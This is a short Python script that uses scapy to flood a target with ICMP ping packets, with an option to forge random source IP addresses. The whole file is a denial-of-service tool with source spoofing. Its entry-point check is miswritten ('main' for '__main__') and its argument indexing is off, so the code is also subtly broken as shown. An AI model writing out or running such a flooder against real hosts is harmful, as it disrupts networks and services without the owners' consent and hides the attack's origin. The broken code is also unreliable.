#!/usr/bin/env python
from scapy.all import IP, ICMP, send, RandIP
import sys
import random

def send_ping(dst_ip, src_ip):
    icmp = IP(src=src_ip, dst=dst_ip) / ICMP()
    send(icmp)

def ping_flood(amount, dst_ip, src_ip):
    for i in range(amount):
        send_ping(dst_ip, src_ip)

def send_ping_spoofed(dst_ip):
    send_ping(dst_ip, RandIP())

def ping_flood_spoofed(amount, dst_ip):
    for i in range(amount):
        send_ping_spoofed(dst_ip)

if __name__ == "main":
    src_ip = sys.argv[2]
    dst_ip = sys.argv[3]
    amount = int(sys.argv[4])
    if src_ip == "spoof":
        ping_flood_spoofed(amount, dst_ip)
    else:
        ping_flood(amount, dst_ip, src_ip)


